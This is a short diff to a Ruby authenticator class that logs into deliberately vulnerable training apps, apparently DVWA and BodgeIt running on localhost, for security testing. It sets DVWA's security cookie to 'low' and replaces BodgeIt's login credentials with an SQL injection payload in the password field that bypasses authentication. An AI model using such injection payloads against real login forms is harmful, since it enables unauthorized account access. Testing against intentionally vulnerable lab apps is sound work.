@@ -26,6 +26,10 @@ class CustomAuthenticator
     form.password = 'password'
 
     agent.submit(form, form.buttons.first)
+
+
+    cookie = HTTP::Cookie.new :domain => '127.0.0.1', :name => 'security', :value => 'low', :path => '/dvwa/'
+    agent.cookie_jar.delete(cookie) << cookie
   end
 
   def self.loginBodgeIt(agent)
@@ -33,9 +37,9 @@ class CustomAuthenticator
 
     form = page.form()
 
-    #Not sure what the actual name and password are.
-    form.username = 'admin'
-    form.password = 'password'
+    #Not sure what the actual name and password are, so let's hack in!
+    form.username = ''
+    form.password = "' or userid = 3 or 'x' = '"
 
     agent.submit(form, form.buttons.first)
   end
